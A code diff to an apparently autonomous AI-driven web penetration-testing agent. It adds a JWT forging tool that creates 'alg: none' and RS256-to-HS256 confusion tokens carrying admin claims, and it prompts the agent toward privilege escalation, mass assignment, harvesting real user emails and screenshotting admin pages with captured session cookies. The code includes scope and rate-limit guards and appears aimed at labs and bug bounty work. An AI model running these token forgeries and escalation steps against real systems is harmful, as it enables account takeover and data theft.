+                        cmd.extend(["--javascript", f"() => {{ document.cookie = '{clean_cookie}; path=/'; }}"])
+
+                    try:
+                        subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+                    except Exception as e:
+                        return {"error": f"gowitness execution failed: {e}", "url": target_url}
+                else:
+                    targets_file = Path(tmp_dir) / "targets.txt"
+                    targets_file.write_text("\n".join(target_urls) + "\n")
+                    cmd = [
+                        binary, "scan", "file",
+                        "-f", str(targets_file),
+                        "-s", str(screenshots_dir),
+                        "--screenshot-format", "png",
+                        "--delay", str(delay),
+                        "--write-jsonl",
+                        "--write-jsonl-file", str(jsonl_path),
+                    ]
+                    if fullpage:
+                        cmd.append("--screenshot-fullpage")
+                    if chrome_bin:
+                        cmd.extend(["--chrome-path", chrome_bin])
+                    for h_k, h_v in merged_headers.items():
+                        cmd.extend(["--chrome-header", f"{h_k}: {h_v}"])
+                    if cookie_header:
+                        clean_cookie = cookie_header.replace("'", "\\'")
+                        cmd.extend(["--javascript", f"() => {{ document.cookie = '{clean_cookie}; path=/'; }}"])
+
+                    try:
+                        subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+                    except Exception as e:
+                        return {"error": f"gowitness batch execution failed: {e}", "urls": target_urls}
+
+                if jsonl_path.exists():
+                    for line in jsonl_path.read_text().splitlines():
+                        if not line.strip():
+                            continue
+                        try:
+                            data = json.loads(line)
+                            fname = data.get("file_name", "")
+                            screenshot_file = str(screenshots_dir / fname) if fname else ""
+                            if not (screenshot_file and os.path.exists(screenshot_file)):
+                                for f in screenshots_dir.glob("*.png"):
+                                    if fname and str(f).endswith(fname):
+                                        screenshot_file = str(f)
+                                        break
+
+                            item_info = {
+                                "url": data.get("url", ""),
+                                "final_url": data.get("final_url", ""),
+                                "title": data.get("title", ""),
+                                "response_code": data.get("response_code", 0),
+                                "file_path": screenshot_file,
+                                "file_name": fname,
+                                "timestamp": datetime.now(timezone.utc).isoformat(),
+                                "technologies": [t.get("value") for t in data.get("technologies", []) if isinstance(t, dict) and t.get("value")],
+                            }
+                            if screenshot_file and os.path.exists(screenshot_file):
+                                item_info["file_size"] = os.path.getsize(screenshot_file)
+                            captured_items.append(item_info)
+                        except Exception:
+                            continue
 
     # Fallback to directory scan if jsonl parsing was empty
     if not captured_items:
@@ -1700,12 +2210,22 @@ def _execute_gowitness(args: Dict[str, Any], target: Target, emit: Any) -> Dict[
     if emit and hasattr(emit, "success"):
         emit.success(f"[✓] Gowitness captured {len(captured_items)} screenshot(s) in {screenshots_dir}")
 
-    return {
+    denied_items = [it for it in captured_items if it.get("access_verdict") == "DENIED / RESTRICTED" or it.get("warning")]
+    result_payload: Dict[str, Any] = {
         "status": "success",
         "screenshots_count": len(captured_items),
         "screenshots_dir": str(screenshots_dir),
         "screenshots": captured_items
     }
+    if denied_items:
+        result_payload["access_verification_warning"] = (
+            "CRITICAL: One or more captured screenshots display ACCESS DENIAL or RESTRICTION banners "
+            "(e.g. '403 · Owner access required', 'Forbidden', 'Access Denied'). "
+            "The active session has NOT achieved administrative/owner access on these routes. "
+            "Do NOT record this as a successful privilege escalation. Continue testing alternative vectors (e.g. Mass Assignment, nested property injection, client JS analysis)."
+        )
+
+    return result_payload
 
 
 def _execute_record_finding(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
@@ -1760,9 +2280,9 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
         parameters={
             "type": "object",
             "properties": {
-                "url": {"type": "string", "description": "Target URL to capture screenshot for (e.g. https://example.com/pulse/portal or https://target.com/pulse)."},
+                "url": {"type": "string", "description": "Target URL to capture screenshot for (e.g. https://target.com/dashboard or https://target.com/admin)."},
                 "urls": {"type": "array", "items": {"type": "string"}, "description": "Optional list of multiple target URLs to screenshot in batch."},
-                "headers": {"type": "object", "description": "Optional custom HTTP headers (e.g. {'Cookie': 'p_sid=sess_123', 'Authorization': 'Bearer ...'})."},
+                "headers": {"type": "object", "description": "Optional custom HTTP headers (e.g. {'Cookie': 'session=abc123', 'Authorization': 'Bearer ...'})."},
                 "cookies": {"type": "object", "description": "Optional session cookies dictionary or cookie string to screenshot authenticated pages."},
                 "fullpage": {"type": "boolean", "description": "Capture full scrollable page instead of standard viewport (default: false).", "default": False},
                 "delay": {"type": "integer", "description": "Delay in seconds before capturing to allow JavaScript rendering (default: 2).", "default": 2},
@@ -1881,7 +2401,7 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
             "properties": {
                 "url": {"type": "string", "description": "Full URL to request."},
                 "method": {"type": "string", "description": "HTTP Method: GET, HEAD, POST, PUT, DELETE", "default": "GET"},
-                "headers": {"type": "object", "description": "Optional custom HTTP headers dictionary (e.g. {'Content-Type': 'application/json', 'Cookie': 'p_sid=...'})."},
+                "headers": {"type": "object", "description": "Optional custom HTTP headers dictionary (e.g. {'Content-Type': 'application/json', 'Cookie': 'session=...'})."},
                 "cookies": {"type": "object", "description": "Optional cookies dictionary or string."},
                 "json": {"type": "object", "description": "JSON payload object to send in the request body (automatically sets Content-Type: application/json)."},
                 "data": {"type": "string", "description": "Raw string payload or URL-encoded form data to send in request body."}
@@ -1890,14 +2410,43 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
         },
         executor=_execute_curl
     ),
+    "jwt_forge": ToolSpec(
+        name="jwt_forge",
+        description="Decode and forge JSON Web Tokens (JWTs) for privilege escalation and auth bypass testing. Only applicable when a valid 3-part 'eyJ...' JWT token is present in the target response or Authorization header. Do NOT use on opaque session cookies (sess_..., connect.sid, PHPSESSID). Generates 'alg: none' unsigned tokens and RSA-to-HMAC (RS256->HS256) algorithm confusion tokens with elevated claims (e.g. role: admin), and automatically updates session state for subsequent tool calls.",
+        parameters={
+            "type": "object",
+            "properties": {
+                "token": {
+                    "type": "string",
+                    "description": "Original JWT string to base forgery on. If omitted, uses active session token from target state."
+                },
+                "claims": {
+                    "type": "object",
+                    "description": "Key-value dictionary of claims to modify or add (e.g. {'role': 'admin', 'isAdmin': true, 'admin': true}). Default: {'role': 'admin'}."
+                },
+                "algorithm": {
+                    "type": "string",
+                    "description": "Algorithm to forge: 'none' (unsigned), 'HS256' (algorithm confusion), or 'all' (default: 'all').",
+                    "default": "all"
+                },
+                "public_key_or_secret": {
+                    "type": "string",
+                    "description": "RSA Public Key PEM string or HMAC secret key for HS256 signing (optional)."
+                }
+            }
+        },
+        executor=_execute_jwt_forge
+    ),
     "spider": ToolSpec(
         name="spider",
-        description="Crawl target web application to discover endpoints, URL parameters, form fields, and JavaScript assets.",
+        description="Crawl target web application to discover endpoints, URL parameters, form fields, and JavaScript assets. Supports authenticated crawling with session cookies or Authorization headers.",
         parameters={
             "type": "object",
             "properties": {
                 "url": {"type": "string", "description": "Base URL of the target application to crawl."},
-                "depth": {"type": "integer", "description": "Crawl recursion depth (default: 2)", "default": 2}
+                "depth": {"type": "integer", "description": "Crawl recursion depth (default: 2)", "default": 2},
+                "headers": {"type": "object", "description": "Optional custom HTTP headers (e.g. {'Authorization': 'Bearer ...'})."},
+                "cookies": {"type": "object", "description": "Optional session cookies string or dictionary to crawl authenticated pages."}
             },
             "required": ["url"]
         },
@@ -2131,14 +2680,13 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
 def extract_path_scope(user_text: str) -> Optional[str]:
     """
     If the user's task text names a specific URL or path
-    (e.g. "...from this endpoint https://host/pulse" or "/pulse/portal"), return that first
-    path segment (e.g. "/pulse") as the task's path scope.
+    (e.g. "...from this endpoint https://host/app" or "/app/dashboard"), return that first
+    path segment (e.g. "/app") as the task's path scope.
 
-    Multi-lab hosts (several independent challenge apps living under
-    different top-level paths on the same domain, e.g. /meridian,
-    /cargoflow, /lumen, /pulse) are common in CTF/lab environments — a task
-    scoped to one endpoint should not wander into the others. Returns None
-    if no path is present (task is domain-wide) so nothing is restricted.
+    Multi-tenant hosts (several independent applications or challenges living under
+    different top-level paths on the same domain) — a task scoped to one endpoint should
+    not wander into the others. Returns None if no path is present (task is domain-wide)
+    so nothing is restricted.
     """
     if not user_text:
         return None
@@ -2155,7 +2703,7 @@ def extract_path_scope(user_text: str) -> Optional[str]:
         except Exception:
             pass
 
-    # 2. Explicit path references like "/pulse", "/pulse/portal", "/cargoflow"
+    # 2. Explicit path references like "/app", "/app/dashboard", "/service"
     m_path = re.search(r'(?:^|\s)(/[a-zA-Z0-9_\-\.]+)', user_text)
     if m_path:
         cand = m_path.group(1).rstrip(".,;:!?)>\"'")
@@ -2167,7 +2715,7 @@ def extract_path_scope(user_text: str) -> Optional[str]:
 
 
 def _url_in_path_scope(url: str, path_scope: str) -> bool:
-    """True if url's path falls under path_scope (e.g. '/pulse')."""
+    """True if url's path falls under path_scope (e.g. '/app')."""
     try:
         p = (urlparse(url).path or "").rstrip("/")
         scope = path_scope.rstrip(".,;:!?)>\"'").rstrip("/")
@@ -2189,13 +2737,21 @@ class Agent:
             test_rps=1.0,
             safe_methods_only=True
         )
-        self._turn_path_scope: Optional[str] = None  # e.g. "/pulse" — set per-turn in handle_message
+        self._turn_path_scope: Optional[str] = None  # e.g. "/app" — set per-turn in handle_message
 
     def set_target(self, target_name: str) -> Target:
         self.target = create_or_load_target(target_name)
         self.history = self.target.state.get("history") or []
         if not isinstance(self.history, list):
             self.history = []
+        self._turn_path_scope = None  # Reset path scope to prevent bleeding from previous target
+        self.guard = AutopilotGuard(  # Reset circuit breaker and rate limiters for the new target
+            circuit_threshold=5,
+            circuit_cooldown=60.0,
+            recon_rps=10.0,
+            test_rps=1.0,
+            safe_methods_only=True
+        )
         return self.target
 
     def _get_trimmed_history(self, max_turns: int = 6, for_chat: bool = False, turn_start_idx: Optional[int] = None) -> List[Dict[str, str]]:
@@ -2291,17 +2847,43 @@ class Agent:
                     "blocked": True
                 }
 
-        # 1b. Enforce per-turn path scope (multi-lab hosts: a task scoped to
-        # one endpoint, e.g. /pulse, must not wander into sibling apps like
-        # /meridian, /cargoflow, /lumen living on the same domain).
+        # 1b. Enforce per-turn path scope (when a task is scoped to a specific
+        # base path, tool calls must not wander into sibling applications on the same host).
         if self._turn_path_scope and tool_name not in ("run_terminal_command", "record_finding", "export_report"):
             url_candidate = args.get("url") or args.get("request_ref")
             if url_candidate and str(url_candidate).startswith(("http://", "https://", "/")):
                 if not _url_in_path_scope(str(url_candidate), self._turn_path_scope):
+                    # Auto-correct URL if it targeted the active host but omitted the path scope prefix
+                    parsed = urlparse(str(url_candidate))
+                    clean_scope = "/" + self._turn_path_scope.strip("/.,;:!?)>\"'")
+                    if parsed.scheme and parsed.netloc:
+                        if self.target.name in parsed.netloc or parsed.netloc in self.target.name:
+                            new_path = f"{clean_scope}{parsed.path}"
+                            new_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
+                            if parsed.query:
+                                new_url += f"?{parsed.query}"
+                            if args.get("url"):
+                                args["url"] = new_url
+                            if args.get("request_ref"):
+                                args["request_ref"] = new_url
+                            url_candidate = new_url
+                            if emit and hasattr(emit, "info"):
+                                emit.info(f"Auto-scoped URL to active lab path: {new_url}")
+                    elif str(url_candidate).startswith("/"):
+                        new_path = f"{clean_scope}{url_candidate}"
+                        if args.get("url"):
+                            args["url"] = new_path
+                        if args.get("request_ref"):
+                            args["request_ref"] = new_path
+                        url_candidate = new_path
+                        if emit and hasattr(emit, "info"):
+                            emit.info(f"Auto-scoped URL to active lab path: {new_path}")
+
+                if not _url_in_path_scope(str(url_candidate), self._turn_path_scope):
                     reason = (
-                        f"Requested URL '{url_candidate}' is outside the active lab path scope ('{self._turn_path_scope}'). "
-                        f"All tool calls MUST be formatted with the prefix '{self._turn_path_scope}' (e.g. 'https://{self.target.name}{self._turn_path_scope}/portal' or 'https://{self.target.name}{self._turn_path_scope}/api/...'). "
-                        f"Do NOT send requests to the bare root domain '/' or sibling lab paths."
+                        f"Requested URL '{url_candidate}' is outside the active path scope ('{self._turn_path_scope}'). "
+                        f"All tool calls MUST be formatted with the prefix '{self._turn_path_scope}' (e.g. 'https://{self.target.name}{self._turn_path_scope}/dashboard' or 'https://{self.target.name}{self._turn_path_scope}/api/...'). "
+                        f"Do NOT send requests to out-of-scope paths."
                     )
                     if emit and hasattr(emit, "warn"):
                         emit.warn(f"[!] PATH SCOPE REFUSAL: {url_candidate} — {reason}")
@@ -2450,7 +3032,7 @@ class Agent:
 
             path_rule = ""
             if self._turn_path_scope:
-                path_rule = f"\n8. CRITICAL: The active lab is scoped strictly to '{self._turn_path_scope}'. All tool URLs MUST start with 'https://{self.target.name}{self._turn_path_scope}/...' (e.g. 'https://{self.target.name}{self._turn_path_scope}/portal' or 'https://{self.target.name}{self._turn_path_scope}/api/auth/login'). Never query the bare root '/' or other lab paths."
+                path_rule = f"\n8. CRITICAL: The active application is scoped strictly to '{self._turn_path_scope}'. All tool URLs MUST start with 'https://{self.target.name}{self._turn_path_scope}/...' (e.g. 'https://{self.target.name}{self._turn_path_scope}/dashboard' or 'https://{self.target.name}{self._turn_path_scope}/api/auth/login'). Never query out-of-scope paths."
 
             return f"""\
 You are HELLHOUND Orchestrator. Your sole job is to evaluate if a tool should be executed next or if tool execution is complete.
@@ -2470,21 +3052,37 @@ RULES:
 1. ONLY call tools when the user explicitly requests active reconnaissance, scanning, enumeration, or analysis of a target.
 2. If the user asks a complex question, hypothetical scenario, asks for cybersecurity advice, or requests a report/summary based on existing findings, do NOT call unnecessary tools. Output "DONE".
 3. For greetings, casual questions, or general discussion, do NOT call any tools. Output "DONE".
-4. Before calling a recon tool (spider, content_discovery, etc.), check the "ALREADY GATHERED" section above — if it already answers what you need (endpoints, params, forms), use that data directly instead of re-crawling. Only re-run a recon tool if the target URL is genuinely new or the existing data is insufficient for the specific next step.
-5. Visual Evidence & High-Value Proof of Concept (gowitness):
-   - When an account takeover, password reset, or authentication bypass is successfully executed (session cookie obtained), IMMEDIATELY capture visual proof using `gowitness` on the authenticated confidential web portal or admin dashboard (e.g. '/pulse/portal', '/pulse/dashboard', '/pulse/admin', '/pulse/profile') with the session cookie (`{{"Cookie": "p_sid=..."}}`).
-   - DO NOT screenshot raw JSON REST API endpoints like '/pulse/api/posts' (raw JSON is inspected via `curl`). Screenshot the confidential admin/portal UI where confidential data/controls are visible to provide concrete visual proof for the report!
-   - After capturing visual proof with `gowitness`, log the verified vulnerability using `record_finding` and output "DONE".
-6. To call a tool, respond ONLY with JSON:
+4. Systematic Route, Script & Client Intelligence Discovery (NEVER GUESS BLIND):
+   - When tools return HTML or JSON, check `discovered_script_assets` or script tags (e.g. `/assets/*.js`, `/static/js/*.js`, `main.js`, `app.js`).
+   - If JavaScript bundle files are present, you MUST fetch and read the `.js` files using `curl` BEFORE probing or guessing backend API endpoints.
+   - Analyze the downloaded JavaScript to extract the real route tables, actual API endpoints (`/api/...`), and client-side authorization conditions.
+   - DO NOT run blind directory fuzzers or invent random API paths when the application's actual JavaScript defines the exact endpoints.
+5. Evidence-Driven Multi-Vector Testing & Exploitation:
+   - Base all attacks on real data structures and routes discovered from application responses and JavaScript analysis.
+   - When testing authentication and access control:
+     a) Register/Login to establish a valid session, and note the session mechanism (opaque cookie vs JWT).
+     b) NEVER attempt JWT attacks (`jwt_forge`, `alg: none`) on opaque session tokens (`sess_...`, `PHPSESSID`, `connect.sid`).
+     c) Map and probe the actual authenticated API endpoints identified in the JavaScript (e.g. account update routes, workspace management, user settings).
+     d) Deep Mass Assignment: When an endpoint rejects direct modification of top-level fields (e.g. `role`), test the secondary or nested property structures discovered during JavaScript analysis.
+     e) Post-Exploitation Verification: When a state-changing request (`PATCH`/`PUT`/`POST`) succeeds (HTTP 200), IMMEDIATELY verify elevated access by re-requesting the previously restricted/forbidden route (e.g. `GET /api/admin/overview` or administrative console) with `curl` to confirm privileged data is now accessible.
+     f) If JWTs are used: test unsigned `alg: none` tokens, algorithm confusion (`RS256` -> `HS256`), and claim tampering (`role`, `sub`, `email`).
+     g) Pivot across discovered endpoints and HTTP verbs (GET, POST, PUT, PATCH, DELETE).
+6. Strict Verification Gate, Visual Proof & Finding Recording (gowitness / record_finding):
+   - In modern Single-Page Applications (SPAs), HTTP 200 merely returns the frontend shell. Inspect the response body or screenshot for error states: "403", "Owner access required", "Access Denied", "Forbidden", or login prompts.
+   - A privilege escalation or bypass is ONLY confirmed when privileged data (billing secrets, API keys, member directories, configuration settings) is genuinely returned or unlocked.
+   - MANDATORY ACTION BEFORE OUTPUTTING 'DONE': Whenever you successfully authenticate, escalate privileges (e.g. customer -> ops_admin/admin/owner), or access internal/restricted tooling:
+     1. Capture visual proof of the unlocked page or dashboard using `gowitness`.
+     2. Record the confirmed vulnerability and reproduction proof using `record_finding`.
+     3. ONLY after executing both tools, output "DONE".
+7. To call a tool, respond ONLY with pure JSON (do NOT output natural language commentary or '(Suggested next tool: ...)'):
 ```json
 {{
   "tool": "<tool_name>",
   "args": {{ ... }}
 }}
 ```
-7. If no further tools are needed, or after inspecting tool findings, respond with "DONE".
-8. When testing authentication or password recovery workflows, do NOT invent dummy emails (e.g., test@example.com, admin@local). If crawler results show data/content endpoints (posts, news, users, profiles), fetch them first with curl GET to harvest real user/staff identities.{path_rule}
-9. JWT Testing & Algorithm Confusion: If the target application utilizes JSON Web Tokens (JWTs in cookies like `p_sid`, `token`, `session` or `Authorization: Bearer` headers), test for `alg: none` unsigned token bypass (base64url header `{"alg":"none","typ":"JWT"}` with forged admin payload and trailing dot with empty signature) and RSA public key confusion (signing HS256 with public key / JWKS as secret) before reporting authentication failure.
+8. When testing authentication or password recovery workflows, harvest real user identities/emails from application content or endpoints rather than inventing dummy emails.{path_rule}
+9. If no further tools are needed, or after recording all findings and capturing visual proof, respond with "DONE".
 """
 
         # Build live investigation context summary
@@ -2498,7 +3096,7 @@ RULES:
 
         path_scope_synth = ""
         if self._turn_path_scope:
-            path_scope_synth = f"\nACTIVE LAB PATH SCOPE: '{self._turn_path_scope}'"
+            path_scope_synth = f"\nACTIVE PATH SCOPE: '{self._turn_path_scope}'"
 
         report_requested = any(kw in original_user_text.lower() for kw in ("report", "hackerone", "bug bounty", "poc report", "draft report", "submission", "writeup", "finding", "findings", "proof", "takeover", "summary", "document"))
         has_critical_findings = (
@@ -2527,16 +3125,16 @@ When a vulnerability (such as Account Takeover, Auth Bypass, JWT Algorithm Confu
 - **Target Host**: `{self.target.name}`
 - **Vulnerable Endpoints / Parameters**:
   - Discovered Endpoint / Parameter: `POST/GET https://{self.target.name}{self._turn_path_scope or ''}/...`
-  - Authenticated Member Portal / Dashboard: `GET https://{self.target.name}{self._turn_path_scope or ''}/portal`
+  - Discovered Authenticated UI / Dashboard: `GET https://{self.target.name}{self._turn_path_scope or ''}/...`
 
 ## Step-by-Step Proof of Concept (PoC)
 [Provide exact, reproducible curl commands with real request bodies, forged JWT tokens or reset codes, and response snippets harvested during testing.]
 
 ## Evidence & Screenshots
-[Detail the captured gowitness visual screenshots in ~/.hellhound/targets/{self.target.name}/screenshots/ and authenticated session tokens (e.g. p_sid) demonstrating privileged access to confidential records or administrator settings.]
+[Detail the captured gowitness visual screenshots in ~/.hellhound/targets/{self.target.name}/screenshots/ and authenticated session tokens demonstrating privileged access to confidential records or administrator settings.]
 
 ## Business & Security Impact
-[Explain the impact of full account takeover: access to PHI/PII, unauthorized actions, takeover of administrator/staff accounts, and confidential data exfiltration.]
+[Explain the impact of full account takeover: access to confidential records/PII, unauthorized actions, takeover of administrator/staff accounts, and data exfiltration.]
 
 ## Remediation & Mitigation
 [Exact developer remediation recommendations, e.g. enforce strict algorithm allowlists rejecting 'none' and symmetric HMAC when expecting asymmetric RSA, deliver tokens strictly via out-of-band email, invalidate tokens on use, enforce rate limits, and sanitize debug previews in production API responses.]
@@ -2612,9 +3210,9 @@ INSTRUCTIONS:
         _dup_skip_count = 0
 
         # A path scope set in an earlier turn (e.g. "...from this endpoint
-        # https://host/pulse") persists across the session — most follow-up
+        # https://host/app") persists across the session — most follow-up
         # messages ("go for it", "try exploiting that flaw") won't repeat the
-        # URL, but the restriction to that lab's path should still hold.
+        # URL, but the restriction to that application's path should still hold.
         # Only overwrite it when this message names a new path explicitly.
         _new_scope = extract_path_scope(user_text)
         if _new_scope:
@@ -2652,7 +3250,7 @@ INSTRUCTIONS:
                 break
             _prev_ai_resp = ai_resp
 
-            # Check for JSON tool invocation in the response
+            # Check for JSON tool invocation in the response (markdown, pure JSON, or tool prefix patterns)
             tool_call = None
             json_match = re.search(r'```(?:json)?\s*(\{[\s\S]*?\})\s*```', ai_resp)
             if json_match:
@@ -2662,13 +3260,32 @@ INSTRUCTIONS:
                         tool_call = parsed
                 except Exception:
                     pass
-            elif ai_resp.strip().startswith("{") and ai_resp.strip().endswith("}"):
-                try:
-                    parsed = json.loads(ai_resp.strip())
-                    if isinstance(parsed, dict) and "tool" in parsed:
-                        tool_call = parsed
-                except Exception:
-                    pass
+
+            if not tool_call:
+                tool_json_match = re.search(r'(\{\s*"tool"\s*:\s*[\s\S]*\})', ai_resp)
+                if tool_json_match:
+                    try:
+                        parsed = json.loads(tool_json_match.group(1))
+                        if isinstance(parsed, dict) and "tool" in parsed:
+                            tool_call = parsed
+                    except Exception:
+                        pass
+
+            if not tool_call:
+                # Catch patterns like: record_finding { ... } or (Suggested next tool: record_finding { ... })
+                for reg_tool in TOOL_REGISTRY.keys():
+                    pattern = rf'(?:Suggested next tool:\s*)?\b({reg_tool})\b\s*(\{{[\s\S]*\}})'
+                    m = re.search(pattern, ai_resp, re.IGNORECASE)
+                    if m:
+                        t_name_matched = m.group(1).lower()
+                        t_args_str = m.group(2).rstrip(" \t\n\r)")
+                        try:
+                            parsed_args = json.loads(t_args_str)
+                            if isinstance(parsed_args, dict):
+                                tool_call = {"tool": t_name_matched, "args": parsed_args}
+                                break
+                        except Exception:
+                            pass
 
             if tool_call and tool_call.get("tool") in TOOL_REGISTRY:
                 t_name = tool_call["tool"]
@@ -2765,20 +3382,25 @@ INSTRUCTIONS:
                 cancel_check=cancel_check
             )
         else:
-            if report_requested or has_critical_findings:
+            if len(tools_executed) > 0 or report_requested or has_critical_findings:
                 synth_prompt = (
-                    f"The researcher requested: \"{original_user_text}\"\n\n"
+                    f"The researcher requested/instructed: \"{original_user_text}\"\n\n"
                     f"Tools executed this turn: {', '.join(tools_executed)}.\n\n"
-                    f"CRITICAL: Synthesize all findings for target '{self.target.name}' into a complete, professional, ready-to-submit HackerOne vulnerability report detailing the full attack chain, exact PoC commands, leaked tokens, and visual evidence."
+                    f"CRITICAL: Synthesize all results for target '{self.target.name}' into a complete, professional, deep technical vulnerability breakdown and triage report. Include:\n"
+                    f"- Executive Summary & Root Cause: What vulnerability or authorization bypass was identified and how it functions.\n"
+                    f"- Step-by-Step Proof of Concept (PoC): Provide exact, reproducible curl commands with real request bodies, headers, JSON payloads, and response snippets harvested during testing.\n"
+                    f"- Unlocked Access & Impact: Detail elevated roles (e.g. customer -> ops_admin/owner), exposed tenant data, sensitive endpoints, or internal tooling accessed.\n"
+                    f"- Severity Classification & Business Risk (VRT / CVSS rating).\n"
+                    f"- Concrete Next Steps for the researcher."
                 )
             else:
                 synth_prompt = (
                     f"The researcher asked: \"{original_user_text}\"\n\n"
-                    f"Based on the tool results gathered ({', '.join(tools_executed)}), synthesize all findings for target '{self.target.name}' and provide concrete next triage steps."
+                    f"Synthesize the investigation state for target '{self.target.name}' and provide concrete security recommendations."
                 )
 
             if len(tools_executed) > 0 and cfg.get("show_recaps", True):
-                synth_prompt += "\n\nAfter your analysis, end with a single recap line in this exact format:\nrecap: Goal was [goal]. Done: [what was accomplished]. Next: [recommended next step]. (disable recaps in /setup)"
+                synth_prompt += "\n\nIMPORTANT: Write your complete, detailed analysis, PoC commands, and findings with full markdown formatting first. ONLY on the very last line of your response, add a single summary line in this exact format:\nrecap: Goal was [goal]. Done: [what was accomplished]. Next: [recommended next step]."
             
             final_answer, tokens = ask_neural_core(
                 prompt=synth_prompt,
